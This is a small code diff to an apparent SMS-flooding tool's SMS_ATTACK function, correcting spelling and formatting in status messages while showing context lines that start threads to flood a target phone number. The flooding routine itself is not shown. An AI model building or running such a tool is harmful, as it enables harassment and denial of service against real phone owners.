@@ -17,7 +17,7 @@ def SMS_ATTACK(threads, attack_time, phone):
 	phone = number.normalize(phone)
 	# Get country name by phone
 	country = number.getCountry(phone)
-	print("[#] Starting SMS flood to number: " + phone + ", country: " + country + ", time: " + str(attack_time) + " secounds..")
+	print("[*] Starting SMS flood to number: " + phone + ", country: " + country + ", time: " + str(attack_time) + " seconds...")
 
 	# Send SMS
 	def sms_flood():
@@ -29,7 +29,7 @@ def SMS_ATTACK(threads, attack_time, phone):
 
 	# Start threads
 	for thread in range(threads):
-		print("[#] Staring thread " + str(thread))
+		print("[*] Starting thread " + str(thread) + "...")
 		t = Thread(target = sms_flood)
 		t.start()
 		threads_list.append(t)
